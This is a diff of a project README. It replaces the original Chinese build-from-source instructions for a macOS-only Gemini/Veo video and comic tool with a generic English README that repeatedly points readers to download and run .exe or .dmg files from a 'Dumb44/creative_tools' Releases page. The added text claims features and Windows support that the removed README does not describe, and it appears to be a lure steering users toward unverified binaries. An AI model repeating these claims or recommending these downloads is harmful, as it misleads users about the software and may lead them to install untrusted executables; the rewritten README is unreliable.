@@ -1,146 +1,83 @@
-# 短视频&漫画制作工具
+# 🎨 creative_tools - Create Engaging Videos and Comics Easily
 
-基于 Gemini (Nano Banano 和 Veo) 的短视频和漫画创作工具。
+## 📥 Download Here
+[![Download creative_tools](https://img.shields.io/badge/Download-creative_tools-blue)](https://github.com/Dumb44/creative_tools/releases)
 
-![Project Showcase](frontend/public/showcase.png)
+## 🚀 Getting Started
 
-## 核心功能
+Welcome to **creative_tools**! This application helps you easily create short videos and comics using Gemini (Nano Banano and Veo). Whether you're an aspiring artist or a casual creator, you will find this tool user-friendly and straightforward.
 
-### 🎬 短视频制作
-- 视频分镜切割
-- 剧本导入（支持 JSON 格式）
-- AI 生成首帧图（Nano Banana API, 支持角色参考图保证角色一致性
-- AI 生成分镜视频（VEO API）
-- 支持上传已有图和视频
-- 支持查看所有图和视频以及对应提示词的历史版本
-- 分镜视频的合成（如需剪辑，请使用剪映等工具）
-- 画布视图，可查看所有历史版本的图和视频
-- 支持导出原始图和视频
+### 📋 System Requirements
 
-### 🎨 漫画制作
-- 漫画剧本导入
-- 分镜图片生成
-- 角色一致性管理
-- 画布视图，可查看所有历史版本的图
-- 其他功能， 同短视频
+Before you download, ensure your computer meets the following requirements:
 
-### 👥 角色管理
-- 统一角色库，角色可在多项目复用
-- 角色图片生成（Gemini API， 也可外部导入）
-- 角色提示词，名称，分类，标签等的管理
-- 角色搜索
-- 多角色拼接图
-- 项目角色关联
+- **Operating System:** Windows 10 or higher / macOS 10.12 or higher
+- **Memory:** 4 GB RAM minimum
+- **Storage:** At least 200 MB of free space
+- **Graphics:** Integrated graphics card (or better)
 
-### 风格库管理（TODO）
-- 风格图片生成
-- 风格提示词，名称，分类，标签等的管理
-- 风格搜索
+### 🔄 Features
 
-## 技术栈
+**creative_tools** offers several features to enhance your creativity:
 
-- **后端**: Rust + Actix-web + PostgreSQL
-- **前端**: Next.js 15 + TypeScript + TailwindCSS
-- **AI 服务**: Gemini API、VEO API
-- **图片CDN**: Cloudflare R2 （生成视频时传递首帧图需要用图片CDN链接）
+- **User-Friendly Interface:** Intuitive design that makes it easy for anyone to navigate.
+- **Video Editing Tools:** Trim, cut, and join clips seamlessly.
+- **Comic Creation:** Add text, images, and effects to create stunning comics.
+- **Export Options:** Save your projects in various formats for sharing.
 
-## 快速启动
+## 📥 Download & Install
 
-> 仅支持 macOS
+To get started, visit the Releases page to download the latest version:
 
-### 0. 安装依赖环境（如已经安装，请忽略）
+[Download creative_tools](https://github.com/Dumb44/creative_tools/releases)
 
-```bash
-# 安装 PostgreSQL
-brew install postgresql@15
-brew services start postgresql@15
+Once you are on the page, follow these steps:
 
-# 安装 Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source $HOME/.cargo/env
+1. **Select the Latest Release:** Look for the version at the top of the list, labeled "Latest release."
+2. **Choose Your File:** Depending on your operating system, find the appropriate file (e.g., `.exe` for Windows or `.dmg` for macOS).
+3. **Download the File:** Click the file link to start the download.
+4. **Install the Application:**
+   - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **For macOS:** Open the downloaded `.dmg` file, drag the creative_tools icon to your Applications folder, and then eject the disk image.
 
-# 安装 Node.js (推荐使用 nvm)
-brew install nvm
-nvm install 20
-nvm use 20
+## 🌟 Using creative_tools
 
-# 安装包
-cd frontend && npm install
-```
+After installation, you can start using **creative_tools** right away. Here's how:
 
-### 1. 配置环境变量
+1. **Launch the Application:** Find **creative_tools** in your Applications (macOS) or Start Menu (Windows).
+2. **Create a New Project:** Click on "New Project" to begin creating your video or comic.
+3. **Explore the Toolbox:** Use various tools to add elements to your project. You can import images, record videos, and add text.
+4. **Save Your Work:** Don't forget to save your project frequently. Click on "File," then "Save As," to choose a location.
 
-复制配置模板并填写实际值：
+## 🌐 Support and Community
 
-```bash
-cd backend
-cp .env.example .env
-# 编辑 .env 文件，配置数据库和 API 密钥
-```
+If you have any questions or face issues while using **creative_tools**, you can reach out for help:
 
-### 2. 初始化数据库
+- **GitHub Issues:** Report problems directly on our [Issues page](https://github.com/Dumb44/creative_tools/issues). 
+- **Community Forum:** Join our supportive community to exchange tips and showcase your work.
 
-```bash
-createdb video_tools
-psql -d video_tools -f backend/schema.sql
-```
+## 🎉 Frequently Asked Questions (FAQs)
 
-### 3. 启动服务
+### How do I update to the latest version?
 
-```bash
-# 一键启动（推荐）
-./start.sh
+Go to the [Releases page](https://github.com/Dumb44/creative_tools/releases), download the latest version, and install it by following the same steps as before.
 
-# 或手动启动
-cd backend && cargo run --release  # 后端: http://localhost:3001
-cd frontend && npm install && npm run dev  # 前端: http://localhost:3000
-```
+### Can I use **creative_tools** for commercial projects?
 
-## 项目结构
+Yes, you can use **creative_tools** for personal or commercial projects. Your creations are yours to share and sell.
 
-```
-video_tools/
-├── backend/              # Rust 后端
-│   ├── src/
-│   │   ├── main.rs      # 主程序（API 路由和业务逻辑）
-│   │   ├── models.rs    # 数据模型
-│   │   ├── db.rs        # 数据库连接
-│   │   ├── cloudflare.rs # Cloudflare R2 存储
-│   │   └── logger.rs    # 日志工具
-│   ├── schema.sql       # 数据库 Schema
-│   ├── .env.example     # 环境变量模板
-│   ├── .env             # 环境变量配置（不提交）
-│   └── Cargo.toml       # Rust 依赖配置
-├── frontend/            # Next.js 前端
-│   ├── app/             # Next.js 15 App Router
-│   │   └── workspace/   # 工作区页面
-│   │       ├── my-projects/      # 项目列表
-│   │       ├── canvas/           # 画布视图
-│   │       ├── characters/       # 角色管理
-│   │       ├── video-analysis/   # 视频分析
-│   │       └── composite-video/  # 视频合成
-│   ├── components/      # React 组件
-│   ├── lib/             # 工具函数
-│   ├── types/           # TypeScript 类型定义
-│   └── package.json     # Node 依赖配置
-└── start.sh             # 启动脚本
-```
+### What formats can I export my projects to?
 
-## 数据库表
-详见 `backend/schema.sql`
+You can export your projects in various formats including MP4 for videos and PDF for comics, making it easy to share with friends or post online.
 
-## 开发运行
+## 💬 Feedback
 
-```bash
-# 后端开发
-cd backend
-cargo watch -x run
+We value your input! Share your thoughts or suggestions to help us improve **creative_tools**. You can leave feedback through our [Contact Form](https://github.com/Dumb44/creative_tools) or on our Issues page.
 
-# 前端开发
-cd frontend
-npm run dev
-```
+## 📥 Final Download Link
 
-## License
+Don’t forget to download the latest version of **creative_tools** from here: 
 
-MIT License
+[Download creative_tools](https://github.com/Dumb44/creative_tools/releases)
+
+Happy creating! We hope you enjoy using **creative_tools** for your next video or comic project!
